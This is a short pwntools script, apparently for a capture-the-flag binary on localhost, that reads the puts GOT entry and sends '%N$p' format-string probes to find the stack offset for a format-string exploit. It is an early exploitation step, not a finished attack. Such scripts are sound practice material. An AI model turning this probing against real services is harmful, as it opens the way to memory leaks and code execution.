from pwn import *

exe = ELF("./chall", checksec=False)
context.binary = exe
context.log_level = "debug"

r = remote("localhost", 3012)

r.recvline(timeout=1)
r.recvline(timeout=1)
r.recvline(timeout=1)

puts_got = exe.got["puts"]
log.info(f"puts@GOT = {hex(puts_got)}")

# test berbagai offset
for i in range(6, 15):
    payload = f"%{i}$p".encode()
    r.sendline(payload)
    resp = r.recvline(timeout=1).strip()
    log.info(f"%{i}$p = {resp}")

r.interactive()